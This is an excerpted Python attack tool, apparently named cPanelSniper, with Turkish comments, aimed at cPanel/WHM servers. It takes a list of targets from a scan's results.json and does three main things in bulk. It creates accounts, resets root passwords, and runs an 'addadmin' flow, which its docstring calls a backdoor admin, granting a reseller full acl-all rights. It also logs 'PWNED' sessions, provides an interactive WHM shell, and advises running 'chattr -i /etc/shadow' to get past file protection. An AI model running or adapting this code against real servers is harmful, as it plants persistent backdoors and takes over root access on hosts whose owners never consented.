...
import sys, os, re, json, ssl, signal, argparse, threading, time, copy
...
def action_change_passwd(ctx, new_password):
    ...
    _, _, data = action_change_passwd_result(ctx, new_password)
...
def _whm_json_ok_reason(data):
    """WHM JSON yanıtında başarı ve açıklama metni (HTTP 200 olsa bile result=0 olabilir)."""
...
def action_change_passwd_result(ctx, new_password):
    ...
    ok, _ = _whm_json_ok_reason(data)
    return ok, s, data


def action_create_user(ctx, username: str, domain: str, passwd: str):
    """Create new cPanel account"""
    _, _, data = action_create_account_with_result(ctx, username, domain, passwd)
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])


def action_create_account_with_result(ctx, username: str, domain: str, passwd: str):
    """createacct çağrısı; (ok, http_status, data) döner."""
...
def derive_acct_domain_suffix(ctx):
    """Subdomain için hostname eki (canonical → gethostname fallback)."""
    _, host, _, canonical, _, _, _ = ctx
    timeout = ctx[6]
    suffix = ((canonical or host or "").strip().strip(".").lower()
              or "server.local")
    sh, gh = whm_api(*ctx[:6], "gethostname", {}, timeout)
    if sh == 200 and isinstance(gh, dict):
        blob = gh.get("data") or gh
        if isinstance(blob, dict):
            cand = blob.get("hostname") or blob.get("name")
            if cand:
                suffix = str(cand).strip().strip(".").lower() or suffix
        elif isinstance(blob, str) and blob.strip():
            suffix = blob.strip().strip(".").lower()
    return suffix
...
def action_add_admin(ctx, username: str, password: str):
    """
    WHM üzerinden yeni bir cPanel hesabı oluşturur (createacct),
    reseller yapar (setupreseller) ve tüm özelliklere yakın izinleri
    acl-all ile verir (setacls). Etkileşimli kabuktaki «backdoor admin» akışına denktir.
    """
    timeout = ctx[6]
    username = (username or "").strip()
    if not username:
        log("ERR", "addadmin: kullanıcı adı boş")
        return

    suffix = derive_acct_domain_suffix(ctx)
    domain = f"{username}.{suffix}"

    log("API", f"addadmin → createacct  user={username}  domain={domain}")
    _, cre = whm_api(
        *ctx[:6],
        "createacct",
        {
    ...
    safe_print(
        json.dumps(cre, indent=2)[:800]
        if isinstance(cre, dict)
        else str(cre)[:800]
    )
    cre_ok, cre_reason = _whm_json_ok_reason(cre)
    rl = cre_reason.lower()
    # Hesap oluşmadıysa reseller adımları anlamsız/yanıltıcı olur — dur.
    dup_hints = ("already exists", "already owns", "duplicate", "is already")
    allow_reseller_retry = cre_ok or any(h in rl for h in dup_hints)

    if not cre_ok:
        log("WARN", "createacct başarısız (WHM içi result≠1); HTTP koduna güvenme.")
        if "immutable" in rl or "+i" in rl or "/etc/shadow" in rl:
            safe_print(
                f"{C.YELLOW}  [/etc/shadow] dosyası immutable (+i); Linux kullanıcısı "
                f"eklenemiyor. Sunucuda root ile: "
                f"chattr -i /etc/shadow  (iş bitince gerekiyorsa tekrar +i){C.RESET}"
            )
        if not allow_reseller_retry:
            safe_print(f"{C.RED}  addadmin iptal — önce hesap oluşturulmalı.{C.RESET}")
            return
        safe_print(f"{C.DIM}  Mevcut hesap varsayımıyla setupreseller deneniyor…{C.RESET}")

    log("API", "addadmin → setupreseller (makeowner=1)")
    _, resell = whm_api(
        *ctx[:6],
        "setupreseller",
        {"user": username, "makeowner": "1"},
        timeout,
    )
    safe_print(
        json.dumps(resell, indent=2)[:800]
        if isinstance(resell, dict)
        else str(resell)[:800]
    )
    res_ok, _ = _whm_json_ok_reason(resell)
    if not res_ok:
        log("ERR", "setupreseller başarısız; setacls atlanıyor.")
        return

    log("API", "addadmin → setacls (acl-all=1)")
    _, acls = whm_api(
        *ctx[:6],
        "setacls",
        {"reseller": username, "acl-all": "1"},
        timeout,
    )
    safe_print(
        json.dumps(acls, indent=2)[:800]
...
def scan(target: str, args) -> dict:
    ...
    if getattr(args, "full_session", False):
        log("PWNED", f"  Session (tam): {session_base}")
    else:
    ...
    if args.action and len(args.target_list) == 1:
        ...
        if a == "list":
            ...
            if pw_ok is not None:
                ...
                with BULK_RECORD_LOCK:
                    if ok:
                        ...
                        getattr(args, "_bulk_passwd_failures", []).append({
                            "target": target,
                            "http_status": http_s,
                            "reason": rsn,
                            "timestamp": ts,
                ...
                if not ok and isinstance(data, dict):
                    ...
                    if "immutable" in rl or "+i" in rl or "/etc/shadow" in rl:
                        safe_print(
                            f"{C.YELLOW}  [/etc/shadow] immutable (+i) — "
                            f"chattr -i /etc/shadow (yetkili konsol){C.RESET}"
                        )
            ...
            if not nu:
                log("ERR", "--new-user required for adduser")
            else:
                nu = nu.strip()
                if not nd:
                    nd = f"{nu}.{derive_acct_domain_suffix(ctx)}"
                    log("INFO", f"adduser otomatik domain: {nd}")
                ok, http_s, data = action_create_account_with_result(
                    ctx, nu, nd, np)
                safe_print(json.dumps(data, indent=2)[:800]
                           if isinstance(data, dict) else str(data)[:800])
                bulk_ok = getattr(args, "_bulk_successes", None)
                if bulk_ok is not None:
                    ver = (result.get("finding") or {}).get("version")
                    ts = datetime.now().isoformat()
                    ent_ok = {
                        "target": target,
                    ...
                    rsn = _whm_json_ok_reason(data)[1] if isinstance(data, dict) else str(data)
                    with BULK_RECORD_LOCK:
                        if ok:
                            bulk_ok.append(ent_ok)
                        else:
                            bf = getattr(args, "_bulk_failures", None)
                            if bf is not None:
                                bf.append({
                                    "target": target,
                                    "username": nu,
...
def load_targets_from_results_json(path):
    """Scanner results.json → findings[].target URL listesi (sırayı korur, TEKİL)."""
...
def save_bulk_account_reports(ok_list, fail_list, path_ok, path_fail):
    ts = datetime.now().isoformat()
    for outp, payload in (
        (path_ok, {"kind": "bulk_createacct_success", "key": "accounts",
                   "items": ok_list}),
        (path_fail, {"kind": "bulk_createacct_failed", "key": "failures",
                     "items": fail_list}),
    ):
    ...
    log("OK", f"Başarılı hesaplar ({len(ok_list)}) → {path_ok}")
    log("OK", f"Başarısız denemeler ({len(fail_list)}) → {path_fail}")


def run_bulk_create_accounts(args):
    urls = load_targets_from_results_json(args.results_json)
    if not urls:
        log("ERR", "results JSON içinde findings[].target yok veya boş")
        sys.exit(1)
    args._bulk_successes = []
    args._bulk_failures = []
    args.action = "adduser"
    print(f"{C.PURPLE}  Toplu createacct (yeni hesap):{C.RESET}")
    print(f"   Kaynak       : {args.results_json}  ({len(urls)} hedef)")
    print(f"   Kullanıcı    : {args.new_user}")
    print(f"   Şifre        : (uzunluk {len(args.passwd or '')})")
    print(f"   Başarı çıktı : {args.bulk_success_out}")
    print(f"   Hata çıktı   : {args.bulk_fail_out}")
    ...
    workers = max(1, min(args.threads, len(urls)))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(run_one, u) for u in urls]
        for _ in as_completed(futs):
            pass

    save_bulk_account_reports(
        args._bulk_successes,
        args._bulk_failures,
        args.bulk_success_out,
        args.bulk_fail_out,
    )
    log("INFO",
        f"Özet: {len(args._bulk_successes)} başarılı, "
        f"{len(args._bulk_failures)} başarısız / {len(urls)} hedef "
        f"({time.time() - t0:.1f}s)")
...
def run_bulk_passwd(args):
    urls = load_targets_from_results_json(args.results_json)
    if not urls:
        log("ERR", "results JSON içinde findings[].target yok veya boş")
        sys.exit(1)
    args._bulk_passwd_successes = []
    ...
    workers = max(1, min(args.threads, len(urls)))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for _ in as_completed([ex.submit(run_one, u) for u in urls]):
            pass

    save_bulk_passwd_reports(
        args._bulk_passwd_successes,
        args._bulk_passwd_failures,
    ...
    log("INFO",
        ...
        f"{len(args._bulk_passwd_failures)} başarısız / {len(urls)} hedef "
        f"({time.time() - t0:.1f}s)")
...
def whm_shell(ctx):
    ...
    Commands:
      ...
      adduser <user> <pass>             → yeni cPanel hesabı (domain otomatik)
  ...
  {C.CYAN}Account Management:{C.RESET}
    ...
    adduser <u> <p>   Yeni hesap (createacct, domain otomatik)
...
""")
                ...
                if len(parts2) < 2:
                    ...
                    continue
                u, pw = parts2[0].strip(), parts2[1]
                dom = f"{u}.{derive_acct_domain_suffix(ctx)}"
                print(f"  {C.DIM}domain={dom}{C.RESET}")
                ok, _, data = action_create_account_with_result(ctx, u, dom, pw)
                body = (json.dumps(data, indent=2)[:800]
                        if isinstance(data, dict) else str(data)[:800])
                print(body)
                _, rsn = _whm_json_ok_reason(data) if isinstance(data, dict) else (False, "")
                if ok:
                    print(f"  {C.GREEN}createacct OK{C.RESET}")
                else:
                    print(f"  {C.RED}createacct başarısız: {rsn[:400]}{C.RESET}")
                    if "immutable" in rsn.lower() or "+i" in rsn:
                        print(
                            f"{C.YELLOW}  İpucu: /etc/shadow immutable ise "
                            f"chattr -i /etc/shadow{C.RESET}"
                        )
...
Toplu yeni hesap (results.json → createacct, başarılılar ayrı dosyada):
...
Toplu root şifre (results.json → WHM passwd user=root):
  python3 cPanelSniper.py --results-json results.json --bulk-passwd \\
    ...
    bg = p.add_argument_group("Toplu hesap (results.json)")
    bg.add_argument("--results-json", metavar="FILE",
                    help="Scanner çıktısı (--bulk-create-account / --bulk-passwd)")
    bg.add_argument("--bulk-create-account", action="store_true",
    ...
    if getattr(args, "bulk_create_account", False) and getattr(args, "bulk_passwd", False):
        log("ERR", "--bulk-create-account ile --bulk-passwd birlikte kullanılamaz")
        sys.exit(1)

    if getattr(args, "bulk_passwd", False):
        if not args.results_json:
            log("ERR", "--bulk-passwd için --results-json gerekli")
            sys.exit(1)
        if not args.passwd:
            log("ERR", "--bulk-passwd için --passwd gerekli")
            sys.exit(1)
        run_bulk_passwd(args)
        sys.exit(0)

    if getattr(args, "bulk_create_account", False):
        if not args.results_json:
            log("ERR", "--bulk-create-account için --results-json gerekli")
            sys.exit(1)
        if not args.new_user or not args.passwd:
            log("ERR", "--bulk-create-account için --new-user ve --passwd gerekli")
            sys.exit(1)
        run_bulk_create_accounts(args)
        sys.exit(0)
